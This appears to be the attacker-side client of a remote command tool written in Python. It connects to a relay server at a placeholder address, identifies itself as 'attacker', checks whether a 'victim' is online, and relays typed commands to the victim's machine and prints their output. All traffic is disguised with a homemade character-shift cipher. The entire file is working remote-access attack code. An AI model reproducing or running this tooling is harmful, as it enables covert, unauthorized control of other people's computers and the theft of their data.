import socket
import os
from time import sleep
import sys

# Address
SRV_IP   = "SERVER-IP"
SRV_PORT = 3216

# Others
sock = None
connectedToSrv = False

def conettingToServer():
    global sock, connectedToSrv

    while not connectedToSrv: 
        try:
            # Create socket and connect 
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SRV_IP, SRV_PORT))
            connectedToSrv = True
        except:
            sleep(2)  # 2 Seconds timeout
            
    
def startGetCmds():
    global sock, connectedToSrv
    
# Send the identifier
    safeSend(sock, yutiCipher("attacker", "e").encode() )
    if sock.fileno() < 0:
        print("Fucked up in identifier")
    #print("Indetifier sent")
# ----
      
     
# Advanced options for attacker   
    extraInfos = input("\nAdvanced options:\n/victConn: ask if victin is on\n/closeServer: close the server\n-> ")
    
    # If victim connected
    if extraInfos == "/victConn":
        print("Asking to server...")
        
        # Sending req
        safeSend(sock, yutiCipher(extraInfos, "e").encode() )
        if sock.fileno() < 0:
            print("victconn Fucked up 1")
            
        # Recving response
        response = safeRecv(sock, 4096)
        
        if response:
            response = response.decode()
        if sock.fileno() < 0:
            print("victconn Fucked up 2")
            
        # Decrypt it
        response = yutiCipher(response, "d")
        
        # Print response
        print( response )
        
    # Close server
    elif extraInfos == "/closeServer":
        print("Tell to server to shutdown.")
        
        safeSend(sock, yutiCipher(extraInfos, "e").encode() )
        if sock.fileno() < 0:
            print("closeSer Fucked up")
            
        print("Done")
        sock.close()
        sys.exit(0)
        
    # Nothing
    else:
        print("Ok nolla.")
        safeSend(sock, yutiCipher("nolla", "e").encode() )
       
       
# Main loop  
    while connectedToSrv: 
        
        # Get the command
        cmd = input(">>> ")
        # Print to wait the res
        print("...")
        # Send the command
        safeSend(sock, yutiCipher(cmd, "e").encode() )
        # if disconnected 
        if sock.fileno() < 0:
            print("Fucked up during command")
        
        # Recv the response
        output = safeRecv(sock, 4096)
        
        if output:
            output = yutiCipher(output.decode(), "d")
        else:
            print("Disconnesso dal srv")
            sys.exit(1)
            
        if sock.fileno() < 0:
            print("Fucked up during response")
        
        # Print it
        print(f"\n<<< {cmd}:\n{output}")
          
          
    print("Connection closed.") 
    sock.close()


def safeSend(sock, data):
    global connectedToSrv
    try:
        sock.send(data)
    except:
        connectedToSrv = False


def safeRecv(sock, buf):
    global connectedToSrv
    try:
        return sock.recv(buf)
    except:    
        connectedToSrv = False


def yutiCipher(data:str, mode:str):
    lenght = len(data)
    toShift = lenght
    if toShift > 13:
        toShift = 13
        
    output = ""

    if mode.lower() == "e":
        for i in range(lenght):
            
            output += chr( ord(data[i]) + toShift) 

    elif mode.lower() == "d":
        for i in range(lenght):
            output += chr( ord(data[i]) - toShift) 
    else:
        return None

    return output


# Running
try:
    conettingToServer()
    if connectedToSrv:
        startGetCmds()
except KeyboardInterrupt:
    sock.close()
    print("End.")
